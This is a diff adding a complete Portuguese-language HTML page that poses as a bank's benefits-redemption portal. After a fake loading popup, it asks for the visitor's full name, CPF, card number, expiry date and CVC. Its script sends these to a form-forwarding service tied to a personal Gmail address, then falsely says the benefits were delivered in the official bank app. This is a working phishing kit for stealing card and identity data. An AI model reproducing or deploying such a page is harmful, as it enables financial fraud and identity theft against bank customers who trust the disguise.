@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Benefícios do Banco</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+            color: #333;
+        }
+        header {
+            background-color: #004AAD;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            text-align: center;
+            padding: 40px;
+        }
+        button {
+            background-color: #004AAD;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background-color: #0066CC;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+        .popup.show {
+            display: block;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #004AAD;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        form {
+            margin-top: 20px;
+            text-align: left;
+        }
+        form input {
+            display: block;
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px auto;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        footer {
+            background-color: #004AAD;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        .support {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .support a {
+            color: #004AAD;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Bem-vindo ao Portal de Benefícios do Banco</h1>
+        <p>Resgate seus benefícios exclusivos de maneira simples e rápida!</p>
+    </header>
+    <main>
+        <button id="resgatar-btn">Resgatar benefícios 🎉</button>
+        <div class="popup" id="popup">
+            <h2>Aguarde...</h2>
+            <div class="loader"></div>
+            <p>Estamos preparando tudo para você!</p>
+        </div>
+        <div id="form-container" style="display:none;">
+            <h3>Preencha seus dados para resgatar os benefícios</h3>
+            <form id="benefits-form">
+                <input type="text" name="nome" placeholder="Nome Completo" required>
+                <input type="text" name="cpf" placeholder="CPF" required>
+                <input type="text" name="cartao" placeholder="Número do Cartão" required>
+                <input type="text" name="validade" placeholder="Validade (MM/AA)" required>
+                <input type="text" name="cvc" placeholder="CVC" required>
+                <button type="submit">Enviar</button>
+            </form>
+        </div>
+    </main>
+    <footer>
+        <p>© 2024 Benefícios do Banco - Todos os direitos reservados.</p>
+        <div class="support">
+            <p>Precisa de ajuda? <a href="mailto:phcampp@gmail.com">Clique aqui para suporte</a></p>
+        </div>
+    </footer>
+    <script>
+        const resgatarBtn = document.getElementById('resgatar-btn');
+        const popup = document.getElementById('popup');
+        const formContainer = document.getElementById('form-container');
+        const benefitsForm = document.getElementById('benefits-form');
+
+        resgatarBtn.addEventListener('click', () => {
+            popup.classList.add('show');
+            setTimeout(() => {
+                popup.classList.remove('show');
+                formContainer.style.display = 'block';
+            }, 5000);
+        });
+
+        benefitsForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const formData = new FormData(benefitsForm);
+            const data = Object.fromEntries(formData.entries());
+
+            fetch('https://formsubmit.co/phcampp@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Seus benefícios foram enviados no aplicativo oficial do banco!');
+                    benefitsForm.reset();
+                } else {
+                    alert('Ocorreu um erro. Tente novamente.');
+                }
+            })
+            .catch(error => {
+                alert('Erro ao enviar os dados. Verifique sua conexão e tente novamente.');
+            });
+        });
+    </script>
+</body>
+</html>
